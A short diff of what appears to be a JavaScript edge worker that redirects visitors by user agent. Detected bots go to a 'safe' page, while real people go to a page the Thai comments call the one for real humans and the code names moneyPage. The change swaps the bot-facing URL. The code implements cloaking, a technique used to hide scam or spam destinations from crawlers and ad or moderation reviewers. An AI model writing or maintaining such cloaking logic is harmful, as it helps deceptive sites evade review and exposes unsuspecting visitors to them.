@@ -8,7 +8,7 @@ export default {
     const isBot = botPattern.test(userAgent);
 
     // ปลายทาง
-    const safePage = 'https://skipme.link/add-line'; // สำหรับบอท
+    const safePage = 'https://skipme.link/Friend'; // สำหรับบอท
     const moneyPage = 'https://skipme.link/toweb';   // สำหรับคนจริง
 
     if (isBot) {
